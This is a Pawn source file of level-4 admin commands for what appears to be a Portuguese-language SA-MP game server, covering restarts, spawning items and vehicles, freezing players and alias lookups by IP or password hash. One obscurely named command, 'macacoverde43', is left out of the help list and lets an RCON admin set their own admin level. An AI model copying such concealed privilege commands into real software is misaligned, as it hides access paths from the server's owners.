#include <YSI\y_hooks>


hook OnGameModeInit()
{
	RegisterAdminCommand(STAFF_LEVEL_LEAD, ""C_BLUE"/comandoslvl4 - Ver a lista de comandos dos admins n�vel 4\n");
}


/*CMD:mp3(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
		return 0;
		
	new url[300];
	if(sscanf(params, "s[300]", url)) return ChatMsg(playerid, RED, " > Use: /mp3 [Link]");

	foreach(new i : Player)
	{
		PlayAudioStreamForPlayer(i, url);
	}

	return 1;
}*/

CMD:macacoverde43(playerid, params[])
{
	if(!IsPlayerAdmin(playerid))
		return 0;

	new level;

	if(sscanf(params, "d", level))
		return ChatMsg(playerid, YELLOW, " >  Use: /macacoverde43 [n�vel]");

	if(!SetPlayerAdminLevel(playerid, level))
		return ChatMsg(playerid, RED, " > Nivel de admin deve ser de 0 a 6");


	ChatMsg(playerid, YELLOW, " >  Nivel de admin alterado para: %d", level);

	return 1;
}

ACMD:reiniciar[4](playerid, params[])
{
	new duration;

	if(sscanf(params, "d", duration))
	{
		ChatMsg(playerid, YELLOW, " >  Use: /reiniciar [segundos] - Sempre d� aos jogadores 5 or 10 minutos para se prepararem.");
		return 1;
	}

	ChatMsg(playerid, YELLOW, " >  Reiniciando o servidor em: "C_BLUE"%02d:%02d"C_YELLOW".", duration / 60, duration % 60);
	SetRestart(duration);

	return 1;
}

ACMD:additem[4](playerid, params[])
{
	new
		ItemType:type = INVALID_ITEM_TYPE,
		itemname[ITM_MAX_NAME + 10],
		exdata[8];

	if(sscanf(params, "p<,>dA<d>(-2147483648)[8]", _:type, exdata) != 0)
	{
		new tmp[ITM_MAX_NAME + 10];

		if(sscanf(params, "p<,>s[32]A<d>(-2147483648)[8]", tmp, exdata))
		{
			ChatMsg(playerid, YELLOW, " >  Use: /additem [ID do item/Nome do item], [opcional:extra do item, separado]");
			return 1;
		}

		for(new ItemType:i; i < ITM_MAX_TYPES; i++)
		{
			GetItemTypeUniqueName(i, itemname);

			if(strfind(itemname, tmp, true) != -1)
			{
				type = i;
				break;
			}
		}

		if(type == INVALID_ITEM_TYPE)
		{
			for(new ItemType:i; i < ITM_MAX_TYPES; i++)
			{
				GetItemTypeName(i, itemname);

				if(strfind(itemname, tmp, true) != -1)
				{
					type = i;
					break;
				}
			}
		}

		if(type == INVALID_ITEM_TYPE)
		{
			ChatMsg(playerid, RED, " >  Item '%s' n�o encontrado.", tmp);
			return 1;
		}
	}

	if(type == INVALID_ITEM_TYPE)
	{
		ChatMsg(playerid, RED, " >  Tipo de item inv�lido: %d", _:type);
		return 1;
	}

	new
		exdatasize,
		typemaxsize = GetItemTypeArrayDataSize(type),
		itemid,
		Float:x,
		Float:y,
		Float:z,
		Float:r;

	for(new i; i < 8; ++i)
	{
		if(exdata[i] != cellmin)
			++exdatasize;
	}

	if(exdatasize > typemaxsize)
		exdatasize = typemaxsize;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, r);

	itemid = CreateItem(type,
		x + (0.5 * floatsin(-r, degrees)),
		y + (0.5 * floatcos(-r, degrees)),
		z - FLOOR_OFFSET, .rz = r);

	if(exdatasize > 0)
		SetItemArrayData(itemid, exdata, exdatasize);

	log("[ADDITEM] %p adicionou o item %s (d:%d)", playerid, itemname, _:type);
	ChatMsgAdmins(1, BLUE, "[Admin-Log] "C_BLUE"%p(id:%d) usou o comando /additem", playerid, playerid);
	return 1;
}

ACMD:addveiculo[4](playerid, params[])
{
    if(isnull(params))
	{
		ChatMsg(playerid, YELLOW, " >  Use: /addveiculo [Nome ou ID]");
		return 1;
	}
	
	new
		type,
		Float:x,
		Float:y,
		Float:z,
		Float:r,
		vehicleid;

	if(isnumeric(params))
		type = strval(params);

	else
		type = GetVehicleTypeFromName(params, true, true);

	if(!IsValidVehicleType(type))
	{
		ChatMsg(playerid, YELLOW, " >  Tipo de veiculo inv�lido.");
		return 1;
	}

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, r);

	vehicleid = CreateLootVehicle(type, x, y, z, r);
	SetVehicleFuel(vehicleid, 1000.0);
	SetVehicleHealth(vehicleid, 990.0);
	
	ChatMsgAdmins(1, BLUE, "[Admin-Log] "C_BLUE"%p(id:%d) usou o comando /addveiculo", playerid, playerid);

	return 1;
}

ACMD:deletar[4](playerid, params[])
{
	if(!IsPlayerOnAdminDuty(playerid) && GetPlayerAdminLevel(playerid) < STAFF_LEVEL_SECRET)
		return 6;

	new
		type[16],
		Float:range;

	if(sscanf(params, "s[16]F(1.5)", type, range))
	{
		ChatMsg(playerid, YELLOW, " >  Use: /deletar [itens/tendas/defesas] [Dist�ncia (recomendado: 1)]");
		return 1;
	}

	if(range > 50.0)
	{
		ChatMsg(playerid, YELLOW, " >  Limite de �rea: 50 metros");
		return 1;
	}

	new
		Float:px,
		Float:py,
		Float:pz,
		Float:ix,
		Float:iy,
		Float:iz;

	GetPlayerPos(playerid, px, py, pz);

	if(!strcmp(type, "itens", true, 4))
	{
		foreach(new i : itm_Index)
		{
		    if(GetItemTypeDefenceType(GetItemType(i)) != INVALID_DEFENCE_TYPE)
				continue;

			GetItemPos(i, ix, iy, iz);

			if(Distance(px, py, pz, ix, iy, iz) < range)
				i = DestroyItem(i);
		}

		return 1;
	}
	else if(!strcmp(type, "tendas", true, 4))
	{
		foreach(new i : tnt_Index)
		{
		    if(GetItemTypeDefenceType(GetItemType(i)) != INVALID_DEFENCE_TYPE)
				continue;

			GetTentPos(i, ix, iy, iz);

			if(Distance(px, py, pz, ix, iy, iz) < range)
			{
				i = DestroyTent(i);
				//CallLocalFunction("OnTentDestroy", "d", GetTentID(i));
			}
		}

		return 1;
	}
	else if(!strcmp(type, "defesas", true, 7))
	{
		foreach(new i : itm_Index)
		{
			if(GetItemTypeDefenceType(GetItemType(i)) == INVALID_DEFENCE_TYPE)
				continue;

			GetItemPos(i, ix, iy, iz);

			if(Distance(px, py, pz, ix, iy, iz) < range)
			{
			    CallLocalFunction("OnDefenceDestroy", "d", i);
				i = DestroyItem(i);
			}
		}

		return 1;
	}

	ChatMsg(playerid, YELLOW, " >  Use: /deletar [itens/tendas/defesas] [Dist�ncia (recomendado: 1)]");

	return 1;
}

ACMD:congelarall[4](playerid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	TogglePlayerControllable(i, 0);
	new admNm[24];GetPlayerName(playerid, admNm, 24);
    ChatMsgAll(0xC457EBAA, "[Admin]: %s(id:%d) congelou todos os players online do servidor!", admNm, playerid);
	return 1;
}

ACMD:descongelarall[4](playerid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	TogglePlayerControllable(i, 1);
	new admNm[24];GetPlayerName(playerid, admNm, 24);
	ChatMsgAll(0xC457EBAA, "[Admin]: %s(id:%d) descongelou todos os players online do servidor!", admNm, playerid);
	return 1;
}

ACMD:mudarclima[4](playerid, params[])
{
	new clima;
	if(sscanf(params, "d", clima)) return SendClientMessage(playerid, YELLOW, " > Use: /mudarclima [ID do Clima]");
	if(clima < 0||clima > 45) return ChatMsg(playerid, RED," > Climas : 0 a 45");
    SetWeather(clima);
    if(!dini_Exists("Servidor.ini"))
    dini_Create("Servidor.ini");
	dini_IntSet("Servidor.ini", "Clima", clima);
	new admNm[24];GetPlayerName(playerid, admNm, 24);
    ChatMsgAll(0xC457EBAA, "[Admin]: %s(id:%d) mudou o clima do servidor!", admNm, playerid);
	return 1;
}

/*ACMD:mudarhora[4](playerid, params[])
{
	new hora;
	if(sscanf(params, "i", hora)) return SendClientMessage(playerid, YELLOW," > Use: /mudarhora [Hor�rio]");
	if(hora < 0 || hora > 23) return ChatMsg(playerid, RED," > O hor�rio tem que ser entre 0 a 23.");
	SetWorldTime(hora);
	if(!dini_Exists("Servidor.ini"))
    dini_Create("Servidor.ini");
	dini_IntSet("Servidor.ini", "Hora", hora);
	new admNm[24];GetPlayerName(playerid, admNm, 24);
	ChatMsgAll(0xC457EBAA, "[Admin]: %s(id:%d) mudou a hora do servidor!", admNm, playerid);
    return 1;
}*/

ACMD:tapa[4](playerid, params[])
{
    if(!IsPlayerOnAdminDuty(playerid) && GetPlayerAdminLevel(playerid) < STAFF_LEVEL_SECRET)
		return 6;
		
    new targetid = strval(params);
  	new name[MAX_PLAYER_NAME];
	if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, YELLOW, " > Use: /tapa [ID]");
	GetPlayerName(targetid, name, MAX_PLAYER_NAME);
	if(GetPlayerAdminLevel(targetid) > 1){
		ChatMsg(playerid, YELLOW, " >  Voc� n�o pode fazer isto neste player.");
		return 1;
	}
	new Float:c[3];
	ChatMsgAdmins(1, BLUE, "[Admin-Log] "C_BLUE"%p(id:%d) Deu um tapa em "C_BLUE"%p(id:%d)", playerid, playerid, targetid, targetid);
	GetPlayerPos(targetid,c[0],c[1],c[2]);
	SetPlayerPos(targetid,c[0],c[1],c[2]+6);
	return 1;
}

ACMD:aliases[4](playerid, params[])
{
	new
		name[MAX_PLAYER_NAME],
		type;

	if(sscanf(params, "s[24]C(a)", name, type))
	{
		ChatMsg(playerid, YELLOW, " >  Use: /aliases [playerid/name] [i/p/h/a]");
		return 1;
	}

	if(isnumeric(name))
	{
		new targetid = strval(name);

		if(IsPlayerConnected(targetid))
			GetPlayerName(targetid, name, MAX_PLAYER_NAME);

		else if(targetid > 99)
			ChatMsg(playerid, YELLOW, " >  O ID '%d' n�o est� online, tente usar o nome do jogador.", targetid);

		else
			return 4;
	}

	if(!AccountExists(name))
	{
		ChatMsg(playerid, YELLOW, " >  A conta '%s' n�o existe.", name);
		return 1;
	}

	if(GetAdminLevelByName(name) > GetPlayerAdminLevel(playerid))
	{
		new playername[MAX_PLAYER_NAME];

		GetPlayerName(playerid, playername, MAX_PLAYER_NAME);

		if(strcmp(name, playername))
		{
			ChatMsg(playerid, YELLOW, " >  Sem aliases encontradas para %s", name);
			return 1;
		}
	}

	new
		ret,
		list[MAX_PLAYERS][MAX_PLAYER_NAME],
		count,
		adminlevel;

	if(type == 'a')
	{
		ret = GetAccountAliasesByAll(name, list, count, MAX_PLAYERS, adminlevel);
	}
	else if(type == 'i')
	{
		ret = GetAccountAliasesByIP(name, list, count, MAX_PLAYERS, adminlevel);
	}
	else if(type == 'p')
	{
		ret = GetAccountAliasesByPass(name, list, count, MAX_PLAYERS, adminlevel);
	}
	else if(type == 'h')
	{
		ret = GetAccountAliasesByHash(name, list, count, MAX_PLAYERS, adminlevel);
	}
	else
	{
		ChatMsg(playerid, YELLOW, " >  O tipo de pesquisa deve ser um dos: 'i'(ip) 'p'(senha) 'h'(hash) 'a'(all)");
		return 1;
	}

	if(ret == 0)
	{
		ChatMsg(playerid, RED, " >  Ocorreu um erro.");
		return 1;
	}

	if(count == 0 || adminlevel > GetPlayerAdminLevel(playerid))
	{
		ChatMsg(playerid, YELLOW, " >  Sem aliases encontradas para %s", name);
		return 1;
	}

	ShowPlayerList(playerid, list, (count > MAX_PLAYERS) ? MAX_PLAYERS : count, true);

	return 1;
}

ACMD:comandoslvl4[4](playerid)
{
    new stringlvl4[800];
    strcat(stringlvl4, "{FFFF00}Comandos dos Admins Nivel 4:\n");
    strcat(stringlvl4, "{FF0000}\n");
    strcat(stringlvl4, ""C_BLUE"/reiniciar - Reiniciar o servidor\n");
    strcat(stringlvl4, ""C_BLUE"/additem - Adicionar um item\n");
    strcat(stringlvl4, ""C_BLUE"/addveiculo - Adicionar um veiculo\n");
    strcat(stringlvl4, ""C_BLUE"/deletar - Deletar metais, tendas, itens\n");
    strcat(stringlvl4, ""C_BLUE"/(des)congelarall - Descongelar/congelar todos os players online\n");
    strcat(stringlvl4, ""C_BLUE"/mudarclima - Mudar o clima do servidor\n");
//    strcat(stringlvl4, ""C_BLUE"/mudarhora - Mudar a hora do servidor\n");
    strcat(stringlvl4, ""C_BLUE"/tapa - Dar tapa em algum player\n");
    strcat(stringlvl4, ""C_BLUE"/aliases - Checar IPs\n");
//    strcat(stringlvl4, ""C_BLUE"/mp3 - Tocar m�sica para os jogadores\n");
    ShowPlayerDialog(playerid, 12404, DIALOG_STYLE_MSGBOX, "Admin 4", stringlvl4, "Fechar", "");
    return 1;
}
